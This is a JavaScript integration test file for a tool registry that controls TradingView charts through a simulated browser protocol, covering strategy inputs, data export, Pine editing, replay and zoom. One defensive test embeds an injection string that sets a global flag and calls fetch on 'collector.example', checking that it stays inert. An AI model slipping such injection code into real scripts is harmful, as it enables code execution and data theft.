import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { buildRuntime } from '../src/runtime.mjs';
import { LocalStore } from '../src/core/storage.mjs';
import { sourceHash } from '../src/features/pine.mjs';
import { createFakeCdp } from './fake-cdp.mjs';

// Exercises the real registry, context, BrowserManager source wrapper, CdpSocket
// transport, JSON serialization and confined storage. The TradingView objects
// below are controlled fixtures; no user browser or external network is used.
async function fixture(t, { barCount = 10003 } = {}) {
  const state = {
    layoutId: 'source01', symbol: 'NASDAQ:AAPL', resolvedSymbol: 'NASDAQ:AAPL',
    timeframe: '60', session: 'regular', type: 1, range: { from: 1000, to: 1600 }, barRange: { from: 10, to: 110 },
    inputs: [{ id: 'length', value: 14 }], visible: true,
    source: '//@version=6\nstrategy("Fixture")\nplot(close)\n', title: 'Fixture',
    refreshReport: true, cookieReads: 0, writes: [], sync: false,
    replay: { started: false, autoplay: false, cursor: 1000, delay: 1000, position: 0 },
    report: {
      currency: 'USD', settings: { dateRange: { backtest: { from: 1000000, to: 2000000 } } },
      performance: { all: { netProfit: 0, totalTrades: 32 }, long: { netProfit: 2 }, short: { netProfit: -2 } },
      trades: Array.from({ length: 32 }, (_, i) => ({ e: { tp: 'le', tm: i * 1000, p: i, b: i }, x: { tm: i * 1000 + 500, p: i + 1, b: i + 1 }, q: 0, tp: { v: i, p: 0 }, cp: { v: i, p: 0 }, v: 1000 + i, cm: 0 })),
      filledOrders: Array.from({ length: 40 }, (_, i) => ({ price: i, quantity: 0 }))
    }
  };
  const refresh = () => {
    if (!state.refreshReport) return;
    state.report = { ...state.report, performance: { ...state.report.performance, all: { ...state.report.performance.all, netProfit: state.inputs[0].value } } };
  };
  const study = {
    getInputValues: () => structuredClone(state.inputs), getInputsInfo: () => [{ id: 'length', name: 'Length' }],
    setInputValues: async values => { state.writes.push('inputs'); state.inputs = structuredClone(values); refresh(); },
    isVisible: () => state.visible, setVisible: value => { state.visible = value; }
  };
  const source = { id: () => 'strategy-1', metaInfo: () => ({ id: 'StrategyScript$USER;fixture', description: 'Fixture' }), reportData: () => state.report, isLoading: () => false, dataWindowView: () => ({ items: () => [] }) };
  const bars = { firstIndex: () => 0, lastIndex: () => barCount - 1, size: () => barCount, valueAt: i => [1000 + i * 60, 0, 3, -1, 2, 0] };
  const main = { bars: () => bars, symbolInfo: () => ({ pro_name: state.resolvedSymbol, subsessions: [{ id: 'regular', description: 'Regular' }, { id: 'extended', description: 'Extended' }] }), symbol: () => state.symbol, interval: () => state.timeframe, sessionId: () => state.session };
  const model = { mainSeries: () => main, dataSources: () => [source] };
  const element = () => ({ isConnected: true, getBoundingClientRect: () => ({ width: 800, height: 400 }), contains(other) { return this === other; }, getAttribute: () => null });
  const widget = { model: () => ({ model: () => model, mainSeries: () => main, changeSessionId: async id => { state.writes.push('session');state.session = id; }, timeScale: () => ({ zoomToBarsRange: async (from, to) => { state.barRange = { from, to }; } }) }), _mainDiv: element() };
  const template = ({ saveSymbol = false, saveInterval = false } = {}) => ({
    panes: [{ sources: [{ type: 'Study', metaInfo: { id: 'StrategyScript$USER;fixture', description: 'Fixture' }, state: { inputs: Object.fromEntries(state.inputs.map(v => [v.id, v.value])), styles: {}, visible: state.visible } }] }],
    ...(saveSymbol ? { symbol: state.symbol } : {}), ...(saveInterval ? { interval: state.timeframe } : {})
  });
  const chart = {
    _chartWidget: widget, symbol: () => state.symbol, resolution: () => state.timeframe, chartType: () => state.type,
    getAllStudies: () => [{ id: 'strategy-1', name: 'Fixture' }], getStudyById: id => id === 'strategy-1' ? study : null,
    getVisibleRange: () => state.range, setVisibleRange: async range => { state.range = range; },
    getVisibleBarsRange: () => state.barRange,
    zoomIn: async () => { state.barRange = { from: state.barRange.from + 10, to: state.barRange.to - 10 }; },
    zoomOut: async () => { state.barRange = { from: state.barRange.from - 10, to: state.barRange.to + 10 }; },
    setSymbol: async value => { state.writes.push('symbol'); state.symbol = value; state.resolvedSymbol = value; },
    setResolution: async value => { state.writes.push('timeframe'); state.timeframe = value; },
    setChartType: async value => { state.writes.push('type'); state.type = value; },
    createStudyTemplate: async options => template(options)
  };
  const watched = read => ({ value: read });
  const replay = {
    isReplayAvailable: () => watched(() => true), isReplayStarted: () => watched(() => state.replay.started),
    isAutoplayStarted: () => watched(() => state.replay.autoplay), currentDate: () => watched(() => state.replay.cursor),
    autoplayDelay: () => watched(() => state.replay.delay), position: () => watched(() => state.replay.position),
    realizedPL: () => watched(() => 0), selectDate: async ms => { state.replay.cursor = ms / 1000; state.replay.started = true; },
    stopReplay: async () => { state.replay.started = false; state.replay.autoplay = false; },
    doStep: async () => { state.replay.cursor += 60; }, toggleAutoplay: async () => { state.replay.autoplay = !state.replay.autoplay; },
    changeAutoplayDelay: async value => { state.replay.delay = value; },
    buy: async () => { state.replay.position++; }, sell: async () => { state.replay.position--; }, closePosition: async () => { state.replay.position = 0; }
  };
  const container = element(), heading = { ...element(), get textContent() { return state.title; } };
  const editor = { getDomNode: () => container, getValue: () => state.source, setValue: value => { state.writes.push('source'); state.source = value; }, getModel: () => ({ uri: 'fixture://pine' }) };
  const document = {
    title: 'TradingView fixture', querySelector: () => null,
    querySelectorAll: selector => selector === '.monaco-editor.pine-editor-monaco' ? [container] : selector === '[data-name="scriptTitle"]' ? [heading] : []
  };
  Object.defineProperty(document, 'cookie', { get() { state.cookieReads++; return 'FIXTURE_COOKIE_CANARY'; } });
  const backend = {
    getStudyTemplatesList: async () => [{ id: 'template-1', name: 'Fixture' }],
    getStudyTemplateById: async () => ({ content: JSON.stringify(template()) }),
    saveStudyTemplate: async () => { throw new Error('This fixture did not authorize a template save.'); }
  };
  const modules = { c: { templates: { exports: { backend } } } };
  const h = createFakeCdp({
    page: {
      URLSearchParams, document,
      TradingViewApi: {
        _activeChartWidgetWV: watched(() => chart), _replayApi: replay,
        _chartWidgetCollection: { metaInfo: { uid: watched(() => state.layoutId) }, getAll: () => [widget], _layoutType: watched(() => 's'), inlineChartsCount: watched(() => 1) },
        symbolSync: () => ({ value: () => state.sync, setValue: value => { state.sync = value; } })
      },
      monaco: { editor: { getEditors: () => [editor], getModelMarkers: () => [] } },
      webpackChunktradingview: { push: payload => payload[2](modules) }
    },
    pageFetch: async url => {
      const u = new URL(url);
      if (u.pathname.endsWith('/list/')) return new Response(JSON.stringify([{ scriptIdPart: 'user-script-1', scriptName: 'Fixture', scriptTitle: 'Fixture', version: 7 }]));
      if (u.pathname.endsWith('/get/user-script-1/7')) return new Response(JSON.stringify({ source: state.source }));
      if (u.pathname.endsWith('/translate_light')) return new Response(JSON.stringify({ success: true, result: { functions2: [], types: [], enums: [] } }));
      throw new Error('Unexpected request from a domain tool: ' + u.pathname);
    }
  });
  const dir = await mkdtemp(join(tmpdir(), 'tv-research-integration-'));
  const runtime = buildRuntime({ browser: h.browser, store: new LocalStore(dir), readonly: false, mutationPolicy: { assert() {} } });
  t.after(async () => { await h.close(); await rm(dir, { recursive: true, force: true }); });
  const ids = { target_id: 'chart-1', expected_layout_id: 'source01' };
  return { ...h, ...runtime, state, chart, main, dir, ids, execute: (name, args = {}) => runtime.registry.execute(name, { ...ids, ...args }) };
}

test('actual catalog injects explicit mutation identities and blocks extra arguments before CDP', async t => {
  const f = await fixture(t);
  const descriptor = f.registry.list().find(tool => tool.name === 'strategy_set_inputs');
  assert.ok(descriptor.inputSchema.required.includes('target_id'));
  assert.ok(descriptor.inputSchema.required.includes('expected_layout_id'));
  await assert.rejects(f.registry.execute('strategy_set_inputs', { entity_id: 'strategy-1', inputs: { length: 20 } }), e => e.code === 'INVALID_ARGUMENT');
  await assert.rejects(f.execute('chart_get_state', { javascript: 'return 1' }), e => e.code === 'INVALID_ARGUMENT');
  assert.equal(f.traffic.length, 0);
});

test('chart, data and strategy metadata use native identity when the tab URL is stale', async t => {
  const f = await fixture(t);
  f.state.layoutId = 'native-copy-42';
  for (const [name, args] of [['chart_get_state', {}], ['data_get_last_bar', {}], ['strategy_get_report', { entity_id: 'strategy-1' }]]) {
    const result = await f.execute(name, args);
    assert.equal(result.layout_id, 'native-copy-42');
  }
  await assert.rejects(f.execute('chart_set_symbol', { symbol: 'BINANCE:BTCUSDT' }), e => e.code === 'LAYOUT_MISMATCH');
  assert.deepEqual(f.state.writes, []);
});

test('real nested strategy input tools do not deadlock and a changed report carries qualified freshness', async t => {
  const f = await fixture(t);
  const before = await f.execute('strategy_get_inputs', { entity_id: 'strategy-1' });
  assert.equal(before.inputs[0].value, 14);
  const probe = await f.execute('strategy_capture', { entity_id: 'strategy-1' });
  const changed = await f.execute('strategy_set_inputs', { entity_id: 'strategy-1', inputs: { length: 23 } });
  assert.equal(changed.verified, true);
  const ready = await f.execute('strategy_wait', { entity_id: 'strategy-1', probe_id: probe.probe_id, expected_inputs: { length: 23 }, expected_symbol: 'NASDAQ:AAPL', expected_timeframe: '60', timeout_ms: 2000 });
  assert.equal(ready.verified, true);
  assert.equal(ready.freshness_evidence.report_payload_changed, true);
  assert.equal(ready.freshness_evidence.report_event_observed, false);
  const report = await f.execute('strategy_get_report', { entity_id: 'strategy-1', probe_id: probe.probe_id, expected_inputs: { length: 23 } });
  assert.equal(report.metrics.netProfit, 23);
  const artifact = await f.execute('strategy_export', { entity_id: 'strategy-1' });
  const exported = JSON.parse(await readFile(artifact.file.path, 'utf8'));
  assert.equal(exported.trades.length, 32);
  assert.equal(exported.trades[0].quantity, 0);
  assert.equal(exported.equity_resolution, 'per_trade');
  assert.ok(artifact.file.path.startsWith(join(f.dir, 'exports') + '/'));
});

test('real browser serialization preserves report probes and refuses stale unchanged results after an input change', async t => {
  const f = await fixture(t);
  f.state.refreshReport = false;
  const probe = await f.execute('strategy_capture', { entity_id: 'strategy-1' });
  await f.execute('strategy_set_inputs', { entity_id: 'strategy-1', inputs: { length: 24 } });
  await assert.rejects(f.execute('strategy_wait', { entity_id: 'strategy-1', probe_id: probe.probe_id, expected_inputs: { length: 24 }, timeout_ms: 1000 }), e => e.code === 'FRESHNESS_UNVERIFIED' && e.details.freshness_evidence.report_payload_changed === false);
});

test('a changed chart label cannot make chart readiness accept unresolved instrument data', async t => {
  const f = await fixture(t);
  f.state.symbol = 'BINANCE:BTCUSDT';
  await assert.rejects(f.execute('chart_wait_ready', { symbol: 'BINANCE:BTCUSDT', timeframe: '60', timeout_ms: 100 }), e => e.code === 'CHART_NOT_READY');
  await assert.rejects(f.execute('data_get_ohlcv', { limit: 10 }), e => e.code === 'CHART_NOT_READY');
  f.state.resolvedSymbol = 'BINANCE:BTCUSDT';
  assert.equal((await f.execute('chart_wait_ready', { symbol: 'BINANCE:BTCUSDT', timeout_ms: 100 })).chart_ready, true);
});

test('complete OHLCV export crosses browser page boundaries and preserves zero-valued market data', async t => {
  const f = await fixture(t);
  const result = await f.execute('data_export_ohlcv', { format: 'json', max_bars: 20000 });
  const data = JSON.parse(await readFile(result.file.path, 'utf8'));
  assert.equal(data.bars.length, 10003);
  assert.equal(data.bars[0].open, 0);
  assert.equal(data.bars[0].volume, 0);
  assert.equal(data.bars.at(-1).time, 1000 + 10002 * 60);
  assert.equal(new Set(data.bars.map(bar => bar.time)).size, 10003);
});

test('Pine source crosses actual CDP as inert JSON, checks omit credentials and saved reads stay first-party', async t => {
  const f = await fixture(t);
  const hostile = '//@version=6\nindicator("Fixture")\n// }); globalThis.COMPROMISED=true; fetch("https://collector.example/");\nplot(close)\n';
  const before = await f.execute('pine_get_source');
  const changed = await f.execute('pine_set_source', { source: hostile, expected_source_sha256: before.source_sha256, expected_title: 'Fixture' });
  assert.equal(changed.source_sha256, sourceHash(hostile));
  assert.equal(f.context.COMPROMISED, undefined);
  assert.equal(f.pageTraffic.length, 0);
  const checked = await f.execute('pine_check', { source: hostile });
  assert.equal(checked.ok, true);
  assert.equal(checked.status, 'light_check_accepted');
  assert.equal(checked.compiled, false);
  assert.equal(checked.editor_compiled, false);
  assert.equal(f.pageTraffic[0].credentials, 'omit');
  assert.equal(f.pageTraffic[0].body.get('source'), hostile);
  const saved = await f.execute('pine_get_saved_source', { script_id: 'user-script-1' });
  assert.equal(saved.version, 7);
  assert.equal(saved.editor_touched, false);
  assert.ok(f.pageTraffic.slice(1).every(request => request.credentials === 'include'));
  assert.ok(f.pageTraffic.every(request => new URL(request.url).hostname === 'pine-facade.tradingview.com'));
  assert.equal(f.state.cookieReads, 0);
  assert.equal(JSON.stringify(f.traffic).includes('FIXTURE_COOKIE_CANARY'), false);
});

test('Pine hash guard still rejects drift across context and wrapper calls', async t => {
  const f = await fixture(t);
  const before = await f.execute('pine_get_source');
  f.state.source += '// user edit\n';
  await assert.rejects(f.execute('pine_set_source', { source: 'replacement', expected_source_sha256: before.source_sha256, expected_title: 'Fixture' }), e => e.code === 'PRECONDITION_FAILED');
  assert.equal(f.state.writes.includes('source'), false);
});

test('pane and native template reads execute through the real wrapper with reference identity and scoped fidelity', async t => {
  const f = await fixture(t);
  const panes = await f.execute('pane_list');
  assert.equal(panes.active_index, 0);
  assert.equal(panes.visible_pane_count, 1);
  assert.equal(panes.panes[0].resolved_symbol, 'NASDAQ:AAPL');
  const sync = await f.execute('pane_set_sync', { controls: { symbol: true } });
  assert.equal(sync.observed.symbol.enabled, true);
  const snapshot = await f.execute('study_template_snapshot', { save_symbol: true });
  assert.equal(snapshot.signature.study_count, 1);
  assert.equal(snapshot.scope, 'active_chart_studies_only');
  const native = await f.execute('study_template_get', { template_id: 'template-1' });
  assert.equal(native.record.template_id, 'template-1');
  assert.match(native.content_sha256, /^[a-f0-9]{64}$/);
  const exported = await f.execute('study_template_export', { template_id: 'template-1' });
  assert.equal(JSON.parse(await readFile(exported.file.path, 'utf8')).content_sha256, native.content_sha256);
});

test('replay integration verifies simulated cursor and position changes and blocks normal timeframe changes', async t => {
  const f = await fixture(t);
  assert.equal((await f.execute('replay_status')).started, false);
  const start = await f.execute('replay_start', { time: 1000, maximum_relocation_seconds: 0 });
  assert.equal(start.observed.current_time, 1000);
  await assert.rejects(f.execute('chart_set_timeframe', { timeframe: '1D' }), e => e.code === 'REPLAY_ACTIVE');
  assert.equal(f.state.timeframe, '60');
  const stepped = await f.execute('replay_step', { bars: 2 });
  assert.deepEqual(stepped.cursor_times, [1060, 1120]);
  const bought = await f.execute('replay_trade', { action: 'buy' });
  assert.equal(bought.simulation_only, true);
  assert.equal(bought.observed.position, 1);
  assert.equal((await f.execute('replay_stop')).observed.started, false);
  assert.equal(f.state.cookieReads, 0);
});

test('browser operations serialize across real asynchronous chart writes and read-only runtime hides mutations', async t => {
  const f = await fixture(t);
  const order = [];
  f.chart.setSymbol = async symbol => { order.push('begin:' + symbol); await new Promise(resolve => setTimeout(resolve, 15)); f.state.symbol = symbol; f.state.resolvedSymbol = symbol; order.push('end:' + symbol); };
  const first = f.execute('chart_set_symbol', { symbol: 'NASDAQ:MSFT' });
  const second = f.execute('chart_set_symbol', { symbol: 'NASDAQ:NVDA' });
  const results = await Promise.all([first, second]);
  assert.deepEqual(order, ['begin:NASDAQ:MSFT', 'end:NASDAQ:MSFT', 'begin:NASDAQ:NVDA', 'end:NASDAQ:NVDA']);
  assert.equal(results[0].observed.symbol, 'NASDAQ:MSFT');
  assert.equal(results[1].observed.symbol, 'NASDAQ:NVDA');
  const readonly = buildRuntime({ browser: f.browser, store: f.store, readonly: true });
  assert.equal(readonly.registry.list().some(tool => tool.name === 'strategy_set_inputs'), false);
  await assert.rejects(readonly.registry.execute('strategy_set_inputs', { ...f.ids, entity_id: 'strategy-1', inputs: { length: 99 } }), e => e.code === 'UNKNOWN_TOOL');
});

test('native session changes verify advertised identity and strategy results can require an exact session', async t => {
  const f = await fixture(t);
  const before = await f.execute('chart_get_session');
  assert.equal(before.session, 'regular');
  assert.deepEqual(before.available_sessions.map(s => s.id), ['regular', 'extended']);
  await assert.rejects(f.execute('chart_set_session', { session: 'invented-session' }), e => e.code === 'SESSION_UNAVAILABLE');
  assert.equal(f.state.writes.includes('session'), false);
  const changed = await f.execute('chart_set_session', { session: 'extended' });
  assert.equal(changed.verified, true);assert.equal(changed.observed.session, 'extended');
  const report = await f.execute('strategy_get_report', { entity_id: 'strategy-1', expected_session: 'extended' });
  assert.equal(report.session, 'extended');
  await assert.rejects(f.execute('strategy_get_report', { entity_id: 'strategy-1', expected_session: 'regular' }), e => e.code === 'TARGET_MISMATCH');
  assert.equal((await f.execute('data_get_last_bar')).session, 'extended');
});

test('native zoom verifies bar endpoints and a silent no-op is an error', async t => {
  const f = await fixture(t);
  assert.equal((await f.execute('chart_get_zoom')).bars_per_screen, 101);
  const inward = await f.execute('chart_zoom', { direction: 'in' });
  assert.equal(inward.verified, true);assert.equal(inward.observed.bars_per_screen, 81);
  const exact = await f.execute('chart_zoom', { bars: 50, right_index: 599, tolerance_bars: 0 });
  assert.equal(exact.observed.bars_range.from, 550);assert.equal(exact.observed.bars_range.to, 599);
  await assert.rejects(f.execute('chart_zoom', { bars: 50, right_index: 5 }), e => e.code === 'RANGE_NOT_LOADED');
  f.chart.zoomIn = async () => {};
  await assert.rejects(f.execute('chart_zoom', { direction: 'in', timeout_ms: 100 }), e => e.code === 'VERIFICATION_FAILED');
});
